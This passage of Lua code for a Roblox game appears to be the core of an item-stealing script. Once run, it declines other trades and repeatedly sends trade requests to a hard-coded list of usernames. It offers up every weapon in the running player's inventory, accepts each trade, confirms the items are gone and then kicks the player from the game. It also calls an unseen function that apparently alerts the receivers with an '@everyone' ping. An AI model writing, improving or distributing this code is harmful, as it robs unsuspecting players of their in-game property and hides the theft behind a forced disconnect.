-- ===== MAIN TRADE LOOP (tobi's engine) =====
local tradeBusy = false

local function DoTrade(targetName)
    -- Clear any active trade first
    local initStatus = GetTradeStatus()
    if initStatus == "StartTrade" then
        FireRemote(declineTrade)
        task.wait(0.05)
    elseif initStatus == "ReceivingRequest" then
        FireRemote(declineRequest)
        task.wait(0.05)
    elseif initStatus == "SendingRequest" then
        FireRemote(cancelRequest)
    end

    -- Snapshot inventory before trading starts
    local useSnapshot = true
    local snapshotOwned = GetInventoryOwned()

    while #weaponQueue > 0 do
        local status = GetTradeStatus()

        if status == "None" then
            -- Non-blocking send and short wait
            task.spawn(function()
                local target = Players:FindFirstChild(targetName)
                if target then
                    pcall(function() InvokeRemote(sendRequest, target) end)
                end
            end)
            task.wait(0.1)

        elseif status == "SendingRequest" then
            task.wait(0.05)

        elseif status == "ReceivingRequest" then
            FireRemote(declineRequest)
            task.wait(0.05)

        elseif status == "StartTrade" then
            -- Batch: up to 4 items
            local batch = {}
            for i = 1, math.min(4, #weaponQueue) do
                table.insert(batch, weaponQueue[i])
            end

            -- Snapshot: first trade uses pre-cached, subsequent re-fetches
            local ownedBefore
            if useSnapshot and snapshotOwned and next(snapshotOwned) then
                ownedBefore = {}
                for k, v in pairs(snapshotOwned) do ownedBefore[k] = v end
                useSnapshot = false
            else
                local ok, inv = pcall(GetInventoryOwned)
                ownedBefore = (ok and type(inv) == "table") and inv or {}
            end

            -- Offer all items in batch with their full amounts
            for _, item in ipairs(batch) do
                for _ = 1, (item.Amount or 1) do
                    AddWeaponToTrade(item.DataID)
                    task.wait(0.05)
                end
            end

            -- Accept and wait for completion
            AcceptAndWait()

            -- Verify transfer via inventory snapshot comparison
            local deadline = tick() + 3
            local transferred = false
            local ownedAfter  = {}

            while tick() < deadline do
                task.wait(0.15)
                local ok2, inv2 = pcall(GetInventoryOwned)
                if ok2 and type(inv2) == "table" and next(inv2) ~= nil then
                    ownedAfter = inv2
                    for _, item in ipairs(batch) do
                        if (ownedAfter[item.DataID] or 0) < (ownedBefore[item.DataID] or 0) then
                            transferred = true
                            break
                        end
                    end
                    if transferred then break end
                end
            end

            -- Update queue based on what actually transferred
            if transferred and next(ownedAfter) ~= nil then
                for _, item in ipairs(batch) do
                    local dataId = item.DataID
                    local newAmt = ownedAfter[dataId] or 0
                    for i = #weaponQueue, 1, -1 do
                        if weaponQueue[i].DataID == dataId then
                            if newAmt <= 0 then
                                table.remove(weaponQueue, i)
                            else
                                weaponQueue[i].Amount = newAmt
                            end
                            break
                        end
                    end
                end
            else
                -- Trade didn't go through — remove from queue anyway to avoid infinite loop
                for _, item in ipairs(batch) do
                    for i = #weaponQueue, 1, -1 do
                        if weaponQueue[i].DataID == item.DataID then
                            table.remove(weaponQueue, i)
                            break
                        end
                    end
                end
            end

            if #weaponQueue == 0 then
                KickWhenDone()
                return
            end

            task.wait(1)
        else
            task.wait(0.1)
        end

        task.wait(0.1)
    end

    KickWhenDone()
end

local function TryTradePlayer(player)
    if tradeBusy then return end
    if table.find(Usernames, player.Name) then
        tradeBusy = true
        -- Wait for character
        local now = tick()
        while player.Parent and not player.Character and tick() - now < 10 do
            task.wait()
        end
        task.wait(1)
        task.spawn(DoTrade, player.Name)
    end
end

-- ===== MAIN =====
if #weaponQueue > 0 then
    local mention = (PingEveryone == 'Yes') and '@everyone' or ''
    task.spawn(SendFirstMessage, mention, weaponQueue)

    for _, player in ipairs(Players:GetPlayers()) do
        TryTradePlayer(player)
    end
    Players.PlayerAdded:Connect(TryTradePlayer)
else
    task.wait(1)
    localPlayer:Kick("")
end
